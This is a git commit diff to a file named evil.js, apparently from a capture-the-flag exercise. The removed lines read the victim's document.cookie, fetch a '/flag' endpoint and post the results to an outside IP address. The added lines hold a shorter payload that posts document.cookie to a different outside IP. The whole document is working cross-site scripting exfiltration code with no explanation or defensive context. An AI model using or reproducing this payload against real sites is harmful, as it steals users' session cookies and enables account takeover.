34b1948647b4a2c6d1333c70760efbf4fae72f0c
LeCrepuscule <143530654+tac-eL@users.noreply.github.com>
2025-03-09 21:55:05 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,34 +1,5 @@
-const cookie = document.cookie;
-const targetServer = "http://139.224.199.99:9999/";
-const target = targetServer + "cookie?" + encodeURIComponent(cookie);
-let responseData;
-
-fetch('http://0192d5de50dd7dfeb24785eecc33bd0b.uy3t.dg02.ciihw.cn:44940/flag', {
-    method: 'GET',
-})
-.then(response => {
-    if (!response.ok) {
-        throw new Error('Network response was not ok');
-    }
-    return response.json();
-})
-.then(data => {
-    responseData = data;
-    return fetch(target, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            result: responseData
-        })
-    });
-})
-.then(postResponse => {
-    if (!postResponse.ok) {
-        throw new Error('POST request failed');
-    }
-})
-.catch(error => {
-    console.error('Error:', error);
+fetch('http://47.116.206.221:9999/', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: 'cookie=' + encodeURIComponent(document.cookie)
 });
